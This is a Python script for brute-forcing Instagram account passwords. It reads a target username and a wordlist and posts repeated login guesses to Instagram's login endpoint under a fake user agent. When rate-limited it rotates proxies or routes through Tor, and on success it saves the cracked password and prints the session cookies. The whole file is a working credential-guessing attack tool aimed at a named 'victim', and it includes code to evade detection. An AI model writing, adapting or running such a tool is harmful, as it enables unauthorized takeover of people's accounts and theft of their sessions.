import os
import time
import json
import argparse
import requests
import threading
from datetime import datetime
from fake_user_agents import fake_agent

instagram_url = "https://www.instagram.com/accounts/login/"
instagram_url_login = "https://www.instagram.com/accounts/login/ajax/"

payload = {
    "queryParams": {},
    "optIntoOneTap": "false"
}

login_header = {
    "User-Agent": fake_agent(),
    "X-Requested-With": "XMLHttpRequest",
    "Referer": instagram_url
}

# Prompt the user to enter the CSRF token
csrf = "xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe"
login_header.update({"x-csrftoken": csrf})

def green(text):
    return "\033[92m{}\033[00m".format(text)

def blue(text):
    return "\033[94m{}\033[00m".format(text)

def red(text):
    return "\033[91m{}\033[00m".format(text)

def attack_start_notify(target):
    try:
        os.system(f'herbe "Starting attack to victim: {target}"')
        print(blue(f"Starting attack to victim: {target}"))
    except:
        print(blue(f"Starting attack to victim: {target}"))

def attack_hack_notify(hack):
    try:
        os.system(f"herbe 'target password founded: {hack}'")
        print(green(f"[+] target password founded: {hack}"))
    except:
        print(green(f"[+] target password founded: {hack}"))

def crack(save, session, password, victim):
    global hack_request
    hack_request = session.post(instagram_url_login, data=payload, headers=login_header)
    threading.Thread(target=attack_start_notify, args=(victim,)).start()
    if save.lower() == "y":
        with open(f"tryed/{victim}", "a") as tryed:
            tryed.write(password)
    print(f"[-] trying password: {password}")
    try:
        hack_data = json.loads(hack_request.text)
    except json.JSONDecodeError:
        print(red("[-] Invalid response from the server. Retrying..."))
        return {"authenticated": False}
    print(f'[{green("INFO")}]: {hack_data}')
    return hack_data

def attack(target, wordlist_file, save, proxies=None):
    tryes = 0
    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)
    for hack in wordlist_file:
        tryes += 1
        hack = hack.strip()
        payload.update({
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{hack}"
        })
        try:
            if crack(save, session, hack, target)["authenticated"]:
                threading.Thread(target=attack_hack_notify, args=(hack,)).start()
                cookies = hack_request.cookies
                cookie_jar = cookies.get_dict()
                csrf_token = cookie_jar['csrftoken']
                print("csrf_token:", csrf_token)
                session_id = cookie_jar['sessionid']
                print("session_id:", session_id)
                with open(f"hacked/{hack}", "a") as hacked:
                    hacked.write(hack)
                break
        except KeyError:
            time.sleep(2)
            print(red("[-] Instagram detected spam attack"))
            if proxies:
                print(green("[+] Changing proxy..."))
                session.proxies.popitem()  # Remove the current proxy
            else:
                print(green("[+] Changing server..."))
                session.proxies = None
            crack(save, session, hack, target)

def load_proxies(proxies_file):
    with open(proxies_file, "r") as file:
        proxies = file.readlines()
    proxies = [proxy.strip() for proxy in proxies]
    proxies = [{'http': proxy, 'https': proxy} for proxy in proxies]
    return proxies

def main():
    target = input(blue("[+] Target username: "))
    payload.update({"username": target})
    wordlist = input(blue("[+] Wordlist path: "))
    try:
        bruteforce = open(wordlist, "r")
    except FileNotFoundError:
        print(red("[-] Wordlist file not found\n[+] Trying to open wordlist.txt file"))
        try:
            bruteforce = open(f'{wordlist}.txt', 'r')
        except FileNotFoundError:
            print(red("[-] wordlist.txt file not found"))
            exit()
    print(blue(f'[+] Changing wordlist path to {wordlist}.txt'))
    save = input(blue("[+] Do you want to save tried passwords (y/n): "))
    if save.lower() == "y":
        print(green(f"[+] The tried passwords file path will be tryed/{target}.txt"))

    use_proxies = input(blue("[+] Enter 'use proxies' to specify a proxies file or 'tor on'/'tor off' to enable/disable Tor: "))
    proxies = None
    if use_proxies.lower() == "use proxies":
        proxies_file = "/root/Desktop/insta/my/proxies_test/proxies_verify.txt"
        proxies = load_proxies(proxies_file)
        if not proxies:
            print(red("[-] Proxies file not found or empty."))
            exit()
    elif use_proxies.lower() == "tor on":
        proxies = {
            'http': 'socks5://localhost:9050',
            'https': 'socks5://localhost:9050'
        }
    elif use_proxies.lower() != "tor off":
        print(red("[-] Invalid input for proxies/Tor. Please enter 'use proxies', 'tor on', or 'tor off'."))
        exit()

    attack(target, bruteforce, save, proxies)

if __name__ == "__main__":
    main()
